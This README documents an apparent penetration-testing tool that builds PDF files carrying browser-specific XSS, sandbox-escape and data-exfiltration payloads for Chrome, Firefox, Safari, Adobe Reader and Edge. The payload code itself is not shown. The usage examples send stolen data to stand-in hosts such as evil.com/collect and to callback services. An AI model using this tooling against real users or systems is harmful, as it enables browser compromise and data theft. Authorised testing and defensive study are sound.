# PDF-XSS Tool v3.0 - Optimized Browser-Specific PDF Payload Generator

## 🚀 PDF Browser Exploitation Framework

A streamlined tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now optimized with browser-specific JSON databases and simplified interface.

## 📁 Project Structure

```
PDF-XSS/
├── script.py                     # Main optimized PDF generator (v3.0)
├── chrome.json                   # Chrome/PDFium specific payloads (15 payloads)
├── firefox.json                  # Firefox/PDF.js specific payloads (15 payloads)
├── safari.json                   # Safari/PDFKit specific payloads (12 payloads)
├── adobe.json                    # Adobe Reader specific payloads (15 payloads)
├── edge.json                     # Microsoft Edge specific payloads (12 payloads)
├── payload_database_backup.json  # Backup of previous payload database
├── requirements.txt              # Python dependencies (none required)
├── IMPROVEMENTS.md               # Feature improvements documentation
├── Files/                        # Generated PDF output directory
└── README.md                     # This file
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 PDF Browser Targeting

### Browser-Specific JSON Databases
- **chrome.json**: Chrome/PDFium specific exploits (15 payloads) - DOM access, file system, command execution, sandbox escape
- **firefox.json**: Firefox/PDF.js specific exploits (15 payloads) - CSP bypass, DOM manipulation, file system access
- **safari.json**: Safari/PDFKit specific exploits (12 payloads) - WebKit integration, macOS-specific features
- **adobe.json**: Adobe Reader/Acrobat specific exploits (15 payloads) - Full JavaScript API exploitation
- **edge.json**: Microsoft Edge specific exploits (12 payloads) - Windows integration, WebView exploitation

### Payload Categories
- **dom_access**: Browser DOM manipulation from PDF context
- **file_system**: Local file system access and directory traversal
- **command_execution**: System command execution and process spawning
- **sandbox_escape**: PDF sandbox restriction bypasses
- **network_exfiltration**: Data exfiltration and covert channels
- **csp_bypass**: Content Security Policy evasion techniques
- **webkit_specific**: Safari WebKit specific exploits
- **windows_integration**: Windows OS integration exploits

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No additional dependencies required

### Installation
```bash
# Navigate to PDF-XSS directory
cd PDF-XSS

# List available browsers and payload counts
python3 script.py --list-browsers

# Generate Chrome PDF files
python3 script.py -b chrome -u http://test.com
```

## 📖 Usage

### Basic Commands

```bash
# Show help and available options
python3 script.py --help

# List available browsers and payload counts
python3 script.py --list-browsers

# Generate Chrome PDF files with custom URL
python3 script.py -b chrome -u http://test.com

# Generate Firefox PDF files (limited to 5)
python3 script.py -b firefox --count 5

# Generate all browsers
python3 script.py -b all -u http://webhook.site/xyz
```

### Browser-Specific PDF Generation

```bash
# Generate individual Chrome PDF files (one payload per file)
python3 script.py -b chrome -u http://test.com

# Generate single file with all Firefox payloads (one payload per page)
python3 script.py -b firefox --single-file -u http://evil.com

# Generate Safari PDF files with custom PDF version
python3 script.py -b safari --pdf-version 1.3 -u http://test.com

# Generate Adobe Reader PDF files
python3 script.py -b adobe -u http://webhook.site/xyz

# Generate Microsoft Edge PDF files
python3 script.py -b edge -u http://collaborator.com
```

### Advanced Options

```bash
# Limit number of payloads
python3 script.py -b chrome --count 3 -u http://test.com

# Use older PDF version (weaker security)
python3 script.py -b firefox --pdf-version 1.3 -u http://test.com

# Custom output directory
python3 script.py -b safari -o CustomOutput -u http://test.com

# Single file mode (one payload per page)
python3 script.py -b adobe --single-file -u http://test.com
```

## 🏁 Command Line Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-h, --help` | Show help message | `python3 script.py --help` |
| `-b, --browser` | Target browser (required) | `-b chrome` |
| `-u, --url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o, --output-dir` | Output directory | `-o Files` |
| `--single-file` | One payload per page mode | `--single-file` |
| `--count` | Limit number of payloads | `--count 5` |
| `--pdf-version` | PDF version (1.0-2.0) | `--pdf-version 1.3` |
| `--list-browsers` | List available browsers | `--list-browsers` |

## 📁 Output Files

**All generated PDF files are automatically stored in the `Files/` directory.**

The tool creates two types of output:

### Individual Files Mode (Default)
- One PDF file per payload
- Naming: `{browser}_{technique}_{timestamp}.pdf`
- Example: `chrome_parent_window_access_20240115_143022.pdf`

### Single File Mode (`--single-file`)
- Multiple PDF files, one payload per page
- Naming: `{browser}_payload_{number}_{timestamp}.pdf`
- Example: `firefox_payload_001_20240115_143025.pdf`

## 🎯 Key Features

### ✅ Optimizations in v3.0
- **Browser-specific JSON databases**: Organized payloads by browser in separate JSON files
- **Simplified command-line interface**: Reduced from 15+ flags to 7 essential flags
- **One payload per page option**: `--single-file` creates separate PDF for each payload
- **Complete payload visibility**: Full JavaScript payload shown in each PDF file
- **OS-aware targeting**: Automatically adapts file paths based on operating system
- **No browser validation removal**: Browser-specific files work without browser flag restrictions

### 🗑️ Removed Complexity
- **Merged and removed scripts**: Combined Another-Script.py and merge_json_payloads.py functionality
- **Simplified payload obfuscation**: Removed complex obfuscation options
- **Removed parallel processing**: Simplified execution model
- **Reduced verbose output**: Cleaner, more focused output

## 🔍 PDF Security Testing Examples

### Generate Test Files for Different Browsers
```bash
# Chrome PDF viewer testing
python3 script.py -b chrome -u http://collaborator.burp.com

# Firefox PDF.js testing  
python3 script.py -b firefox --single-file -u http://webhook.site/xyz

# Adobe Reader API testing
python3 script.py -b adobe -u http://requestbin.com/abc123

# Safari WebKit testing
python3 script.py -b safari --pdf-version 1.4 -u http://test.com
```

### Payload Categories Testing
Each browser JSON file contains categorized payloads:
- **DOM Access**: Test DOM manipulation capabilities
- **File System**: Test local file access restrictions
- **Command Execution**: Test system command execution
- **Network Exfiltration**: Test data exfiltration capabilities

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests

## 📈 Changelog

### Version 3.0 (Current) - Optimization and Simplification
- **✅ Browser-specific JSON databases**: Separate JSON files for each browser (chrome.json, firefox.json, etc.)
- **✅ Simplified script interface**: Single script.py with streamlined flags
- **✅ One payload per page option**: `--single-file` flag creates individual PDFs for each payload
- **✅ Complete payload visibility**: Full JavaScript payloads visible in PDF files with filename headers
- **✅ Removed complexity**: Eliminated Another-Script.py and merge_json_payloads.py
- **✅ OS-aware targeting**: Automatic adaptation of file paths based on operating system
- **✅ Improved documentation**: Updated README with clear examples and usage patterns

### Version 2.0 - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **20+ sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.